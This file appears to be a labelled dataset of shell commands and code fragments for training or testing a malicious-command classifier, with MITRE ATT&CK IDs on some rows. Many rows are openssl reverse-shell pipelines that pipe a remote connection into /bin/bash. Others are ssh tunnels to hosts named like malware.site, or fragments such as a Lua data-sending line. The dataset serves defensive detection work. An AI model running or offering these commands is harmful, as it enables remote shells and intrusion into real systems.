command,label,original_label,mitre_id
openssl s_client -quiet -connect 172.16.0.25:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
aws ecr delete-repository --repository-name repository --force,Benign,Benign,Benign
linode-cli domains view domain_id,Benign,Benign,Benign
find . -type f -print0 | xargs -0 chmod go+r,Benign,Benign,Benign
ssh -R 8080:localhost:9001 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:5432 jenkins@10.0.0.1,Context_Dependent,Synthetic,Synthetic
inkmake [-i|--inkscape] /Applications/Inkscape.app/Contents/Resources/bin/inkscape path/to/Inkfile,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"rmdir ""$(dirname $(dirname $dir))""",Benign,Benign,Benign
vagrant reload,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
ZwSetValueKey(),Malicious,Malicious,T1543
ssh -R 4444:localhost:6379 jenkins@staging.lab,Context_Dependent,Synthetic,Synthetic
blender [-b|--background] path/to/file.blend --python-expr 'import bpy; bpy.data.scenes[0].render.resolution_percentage = 25' [-a|--render-anim],Benign,Benign,Benign
sudo chown el my_test_expect.exp //make el the owner.,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
abduco -Ar name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
idnits --year 2021 path/to/file.txt,Benign,Benign,Benign
find /path/to/files -exec truncate.sh {} \;,Benign,Benign,Benign
cat path/to/key.gpg | sudo tlmgr key add -,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:22,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
"grep --include=\*.{c,h} -rnw '/path/to/somewhere/' -e ""pattern""",Benign,Benign,Benign
cat << EOF > path/to/file.txt <Enter> multiline_data <Enter> EOF,Benign,Benign,Benign
"local b=assert(f:read(""*a""));c:send(b);",Malicious,Malicious,T1059
snmpwalk [-h|--help],Benign,Benign,Benign
kool completion bash|fish|powershell|zsh,Benign,Benign,Benign
"qm set 100 --net0 virtio|e1000|rtl8139|vmxnet3,bridge=vmbr0",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
docker buildx version,Benign,Benign,Benign
"find . -name "".txt"" | grep a",Benign,Benign,Benign
keep-header path/to/file -- grep pattern,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
shutdown -r $timeout,Malicious,Malicious,T1529
sudo vgcreate volume_group /dev/sdXY,Benign,Benign,Benign
mux -o output_muxer_name,Benign,Benign,Benign
eix --not --license license,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
git show-merged-branches,Benign,Benign,Benign
ssh -L 8080:localhost:53 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
"find . -iname ""*.mov"" -printf ""%p %f\n""",Benign,Benign,Benign
find . -type f -iname '*.txt' -print0 | xargs -0 mv {} {}.abc,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
vswhere -products * -latest -prerelease -find **\VC\Auxiliary\Build\vcvarsall.bat,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",Malicious,Malicious,T1105
openssl s_client -quiet -connect 10.10.10.25:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
gksu [-u|--user] userid [-S|--sudo-mode] command,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
pio system info,Benign,Benign,Benign
sudo lvrename [-y|--yes] /dev/vg_name/old_lv /dev/vg_name/new_lv,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
tldr remove-item,Benign,Benign,Benign
pnmcrop [-m|-margin] n [-blan|-blank-image] pass|minimize|maxcrop path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
ssh -L 8080:localhost:8443 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
gamescope [-h|--nested-height] 720 [-H|--output-height] 1440 [-S|--scaler] integer -- command,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
find . -type d -exec chmod 500 {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
New-PSDrive -name $map_name -psprovider filesystem -root \\$computer_name\$share_name,Malicious,Malicious,T1021
xidel https://example.org [-f|--follow] //a [-e|--extract] //title,Benign,Benign,Benign
spi search_terms,Benign,Benign,Benign
transmission-daemon [-t|--auth] [-u|--username] username [-v|--password] password [-p|--port] 9091 [-a|--allowed] 127.0.0.1,Benign,Benign,Benign
gvpack -n path/to/layout1.gv path/to/layout2.gv ... > path/to/output.gv,Benign,Benign,Benign
find . -exec file {} \;,Benign,Benign,Benign
gh screensaver [-s|--saver] fireworks|life|marquee|pipes|pollock|starfield,Benign,Benign,Benign
llvm-mc -o path/to/output.s path/to/input.bc,Benign,Benign,Benign
wikiman -S,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:6379 audit@payload.c2,Context_Dependent,Synthetic,Synthetic
cloud-init clean,Benign,Benign,Benign
lsns [-t|--type] mnt|net|ipc|user|pid|uts|cgroup|time,Benign,Benign,Benign
DisplayName = $p.DisplayName,Context_Dependent,Malicious,T1007
find /usr/bin -type f -atime +100,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
CreateRemoteThread,Malicious,Malicious,T1055
lsinitrd --unpack,Benign,Benign,Benign
Get-History -Id id,Benign,Benign,Benign
xcursorgen --prefix path/to/image_directory/ path/to/config.cursor path/to/output_file,Benign,Benign,Benign
sqlite3 path/to/database.sqlite3 'SELECT * FROM some_table;',Benign,Benign,Benign
"find . -name ""FILES.EXT""",Benign,Benign,Benign
find . -iname .svn -exec bash -c 'rm -rf {}' \;,Benign,Benign,Benign
pdftotext -f 2 -l 4 input.pdf output.txt,Benign,Benign,Benign
pageres https://example.com/ 1366x768 --selector='.page-header',Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
az ad user list,Context_Dependent,Malicious,T1087
rletopnm [--verb|--verbose] path/to/input.rle > path/to/output.pnm,Benign,Benign,Benign
orb status,Benign,Benign,Benign
ogrmerge.py -single -f GeoJSON -o path/to/output.geojson -src_layer_field_name country source_name path/to/input1.shp path/to/input2.shp ...,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8081,Malicious,Synthetic,Synthetic
time cut -f50000000 -d$'\n' myfile.ascii,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
omz changelog,Benign,Benign,Benign
"kaggle [c|competitions] submit competition_name [-f|--file] path/to/file [-m|--message] ""message""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 operator@10.10.10.25,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:80 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
find /path/to/look/in/ -type d | grep .texturedata,Benign,Benign,Benign
ssh -R 8080:localhost:993 backup@example.com,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:80 deploy@192.168.1.10,Context_Dependent,Synthetic,Synthetic
"cat path/to/file | grep [-v|--invert-match] ""search_pattern""",Benign,Benign,Benign
lci path/to/file,Benign,Benign,Benign
sudo ufw delete rule_number,Benign,Benign,Benign
pkcs11-tool [-O|--list-objects] [-p|--pin] auth_pin --slot slot_id,Benign,Benign,Benign
"sudo socat - TCP-LISTEN:8080,fork",Benign,Benign,Benign
dep deploy hostname,Benign,Benign,Benign
ssh -R 4444:localhost:9001 backup@malware.site,Context_Dependent,Synthetic,Synthetic
find . -type f -not -name '.*' -mtime +500 -exec ls {} \;,Benign,Benign,Benign
cpufreq-info [-f|--freq] [-m|--human],Benign,Benign,Benign
mpstat 2,Benign,Benign,Benign
ndc -p path/to/pidfile command,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
opencode models [-h|--help],Benign,Benign,Benign
golangci-lint linters,Benign,Benign,Benign
sudo lchage --maxdays number_of_days username,Benign,Benign,Benign
slurmdbd -s,Benign,Benign,Benign
"paste -d"" "" file1 file2 | paste -d'|' - file3 | sed 's,|, ,g'",Benign,Benign,Benign
find . -name '.?*' -prune,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
poetry build,Benign,Benign,Benign
find -mindepth 0 -maxdepth 0,Benign,Benign,Benign
uncrustify -f path/to/file.cpp -o path/to/output.cpp,Benign,Benign,Benign
cupsd -t -c path/to/cupsd.conf,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
sh,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
kubectl logs [-f|--follow] pod_name,Benign,Benign,Benign
net user art-test $password,Malicious,Malicious,T1078
ifdata -pN -pb -pm eth0,Benign,Benign,Benign
kiterunner brute https://example.com [-A|--assetnote-wordlist] apiroutes-210328:20000,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4445,Malicious,Synthetic,Synthetic
bcd.bat,Malicious,Malicious,T1059
ssh -R 8080:localhost:3389 root@example.com,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:9001 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
mongosh --host host --port port db_name,Benign,Benign,Benign
newsboat [-r|--refresh-on-start],Benign,Benign,Benign
yes | cp -rf /zzz/zzz/* /xxx/xxx,Benign,Benign,Benign
readpe --exports path/to/executable,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
wasm-objdump [-x|--details] file.wasm,Benign,Benign,Benign
ng [b|build] --output-path path/to/directory,Benign,Benign,Benign
shar [-V|--vanilla-operation] path/to/file1 path/to/file2 ... > path/to/archive.sh,Benign,Benign,Benign
"find -type f -printf ""%s %p\n"" | sort -nr | head -n 4 | awk ""{print $2}""",Benign,Benign,Benign
envsubst < path/to/input_file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:993 deploy@10.0.0.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:8080 operator@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
secret-tool store --label=label key value,Benign,Benign,Benign
hg clone [-U|--noupdate] remote_repository_source,Benign,Benign,Benign
"vibe --output json|text|streaming [-p|--prompt] ""your_prompt""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
spotify next,Benign,Benign,Benign
zlib-flate < path/to/input_file -compress=compression_level > path/to/compressed.zlib,Benign,Benign,Benign
ssh -L 8080:localhost:5432 postgres@172.16.5.20,Context_Dependent,Synthetic,Synthetic
Get-WUHistory -MaxDate (Get-Date).AddDays(-1),Benign,Benign,Benign
pct [ex|exec] 100 bash,Benign,Benign,Benign
valkey-cli -u uri,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 deploy@192.168.1.1,Context_Dependent,Synthetic,Synthetic
"sshpass -p ""YOUR_PASSWORD"" ssh -o StrictHostKeyChecking=no YOUR_USERNAME@SOME_SITE.COM",Benign,Benign,Benign
ssh -R 8080:localhost:80 jenkins@10.0.0.100,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:6379 audit@172.16.0.25,Context_Dependent,Synthetic,Synthetic
pnmremap [-ma|-mapfile] path/to/palette_file.ppm [-m|-missingcolor] color path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
if (!(Test-Path -path $path)){,Malicious,Malicious,T1546
checksec file path/to/binary,Benign,Benign,Benign
"QueryLanguage=""WQL"";",Malicious,Malicious,T1546
ssh -R 8080:localhost:9090 operator@172.20.10.8,Context_Dependent,Synthetic,Synthetic
"curl ""url"" | tac | tac | grep -qs foo",Benign,Benign,Benign
"networksetup -getinfo ""Wi-Fi""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
find . -type f -print | xargs grep -i 'bin/ksh',Benign,Benign,Benign
"find temp/images/ -type f -iname Thumbs.db | while read FILE ; do rm ""${FILE}"" ; done",Benign,Benign,Benign
ssh -R 4444:localhost:8443 postgres@10.10.10.10,Context_Dependent,Synthetic,Synthetic
vkcube -h,Benign,Benign,Benign
cfv -Tvnu -f path/to/file,Benign,Benign,Benign
find $YOUR_DIR -type f,Benign,Benign,Benign
cat /etc/hosts,Context_Dependent,Malicious,T1016
directories of the user owned directories (,Malicious,Malicious,T1543
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
ShellExecuteW,Malicious,Malicious,T1106
rustup set auto-self-update enable|disable|check-only,Benign,Benign,Benign
replace path\to\file_or_directory path\to\destination_directory /s,Benign,Benign,Benign
find . | xargs -n 1 echo,Benign,Benign,Benign
gh [ext|extension] [ls|list],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
netlify init,Benign,Benign,Benign
psysh --cwd path/to/directory,Benign,Benign,Benign
playerctl previous,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ghq list --full-path,Benign,Benign,Benign
gendesk [-h|--help],Benign,Benign,Benign
diff -dbU0 a b,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
vcluster list,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:6379,Malicious,Synthetic,Synthetic
pake --transparent https://www.example.com/,Benign,Benign,Benign
duckdb -f path/to/script.sql,Benign,Benign,Benign
Import-Module AzureAD,Malicious,Malicious,T1098
ssh -R 4444:localhost:9090 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
